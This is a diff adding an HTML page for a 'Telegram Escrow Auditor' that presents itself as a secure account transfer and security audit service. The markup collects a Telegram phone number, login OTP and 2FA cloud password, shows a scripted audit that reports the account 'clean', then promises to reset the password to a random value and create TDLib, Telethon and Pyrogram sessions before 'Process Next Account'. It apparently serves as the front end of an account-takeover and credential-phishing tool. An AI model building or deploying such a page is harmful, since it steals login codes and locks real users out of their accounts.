@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Escrow Auditor</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <div class="container">
+        <div class="card">
+            <h1>Escrow Auditor</h1>
+            <p class="subtitle">Secure Account Transfer System</p>
+
+            <div class="step-indicator">
+                <div class="step active" id="s1">1</div>
+                <div class="step" id="s2">2</div>
+                <div class="step" id="s3">3</div>
+                <div class="step" id="s4">4</div>
+            </div>
+
+            <!-- View 1: Init -->
+            <div id="view-init">
+                <div class="form-group">
+                    <label for="phone">Phone Number</label>
+                    <input type="text" id="phone" placeholder="+1234567890" />
+                </div>
+                <button class="btn" onclick="startAuth()" id="btn-init">Start Authentication</button>
+            </div>
+
+            <!-- View 2: OTP & Auth Handling -->
+            <div id="view-otp" class="hidden">
+                <div class="form-group" id="group-otp">
+                    <label for="otp">كود التحقق (OTP)</label>
+                    <input type="text" id="otp" placeholder="12345" maxlength="5" />
+                </div>
+
+                <div class="form-group hidden" id="group-password">
+                    <label for="password-2fa">كلمة مرور التحقق بخطوتين (2FA)</label>
+                    <input type="password" id="password-2fa" placeholder="أدخل كلمة المرور السحابية" />
+                </div>
+
+                <div class="form-group hidden" id="group-register">
+                    <label for="reg-first-name">الاسم الأول</label>
+                    <input type="text" id="reg-first-name" placeholder="الاسم الأول" />
+                    <br>
+                    <label for="reg-last-name">الاسم الأخير (اختياري)</label>
+                    <input type="text" id="reg-last-name" placeholder="الاسم الأخير" />
+                </div>
+
+                <button class="btn" onclick="handleAuthAction()" id="btn-auth-action">تأكيد</button>
+            </div>
+
+            <!-- View 3: Audit -->
+            <div id="view-audit" class="hidden">
+                <div class="status-box info" id="audit-log">
+                    Ready to scan account security...
+                </div>
+                <br>
+                <button class="btn" onclick="runAudit()" id="btn-audit">Run Deep Security Audit</button>
+            </div>
+
+            <!-- View 4: Finalize -->
+            <div id="view-finalize" class="hidden">
+                <div class="status-box success">
+                    Audit Passed! Account is clean.
+                </div>
+                <br>
+                <p style="font-size: 13px; color: #94a3b8; margin-bottom: 15px;">
+                    Clicking Finalize will generate local RSA keys, lock the account with a new random password, and
+                    encrypt sessions.
+                </p>
+                <button class="btn" onclick="finalizeAccount()" id="btn-finalize">Lockdown & Finalize</button>
+            </div>
+
+            <!-- View 5: Success -->
+            <div id="view-success" class="hidden">
+                <div style="text-align: center;">
+                    <h2 style="color: #10b981; margin-bottom: 10px;">Transformation Complete</h2>
+                    <p style="color: #cbd5e1;">The account is now Secured & Encrypted.</p>
+                    <div class="status-box" style="text-align: left; margin-top: 20px;">
+                        <strong>Status:</strong> SECURED<br>
+                        <strong>Sessions:</strong> 3 (TDLib, Telethon, Pyrogram)<br>
+                        <strong>Keys:</strong> RSA-2048 Encrypted<br>
+                    </div>
+                    <br>
+                    <button class="btn" onclick="location.reload()">Process Next Account</button>
+                </div>
+            </div>
+
+            <div id="global-status" class="status-box hidden" style="margin-top:20px"></div>
+
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+
+</html>
